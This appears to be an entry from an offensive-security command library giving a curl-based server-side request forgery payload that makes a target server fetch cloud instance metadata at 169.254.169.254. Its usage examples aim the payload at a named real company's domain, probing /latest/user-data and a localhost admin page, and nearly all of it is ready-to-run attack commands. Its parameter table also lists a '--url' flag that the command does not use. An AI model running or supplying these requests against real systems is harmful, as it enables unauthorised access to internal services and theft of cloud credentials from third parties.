---
data: >-
  curl
  "https://target.com/endpoint?url=http://169.254.169.254/latest/meta-data/" -v
tags:
  - ssrf
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: a3ee6e82-040b-478a-a093-ec2b115c5784
created_at: '2025-12-14T03:53:38.430Z'
updated_at: '2025-12-14T03:53:38.431Z'
verified: false
validated: true
submitted: true
---
# curl-internal-ssrf-payload

## Command

```bash
curl "https://target.com/endpoint?url=http://169.254.169.254/latest/meta-data/" -v
```

## Description

This command exploits SSRF by directing the server to request internal cloud metadata, useful for enumerating infrastructure details in cloud-hosted applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--url` | Vulnerable URL parameter | Yes |
| `http://169.254.169.254/latest/meta-data/` | Internal metadata endpoint (AWS example) | Yes |
| `-v` | Verbose mode to inspect responses | No |

## Examples

### Basic Usage

```bash
curl "https://ideas.starbucks.com/endpoint?url=http://127.0.0.1/admin" -v
```

### Advanced Usage

```bash
curl "https://ideas.starbucks.com/endpoint?url=http://169.254.169.254/latest/user-data" -v
```

## Expected Output

Response contains metadata like {"instance-id": "i-1234567890abcdef0"}, confirming internal access.

## Related

- [[Related Procedure: Exploit-SSRF-to-Access-Internal-Resources]]
